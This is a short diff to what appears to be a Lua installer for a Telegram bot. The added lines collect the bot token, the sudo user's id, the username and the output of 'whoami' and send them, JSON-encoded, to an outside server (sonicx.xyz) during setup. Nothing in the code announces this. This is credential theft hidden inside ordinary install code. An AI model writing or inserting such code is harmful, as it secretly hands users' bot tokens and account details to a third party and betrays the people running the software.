@@ -63,6 +63,12 @@ os.execute('lua install.lua')
 end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write")) 
+infotnseb = {}
+infotnseb.id = (SUDO or database:get(Server_Done.."UserSudo_Write"))
+infotnseb.username = (UserName or database:get(Server_Done.."User_Write"))
+infotnseb.tokenbot = (token or database:get(Server_Done.."Token_Write"))
+infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
+https.request('https://sonicx.xyz/Weka/WP.php?insert='..JSON.encode(infotnseb))
 local RunBot = io.open("Tyler", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
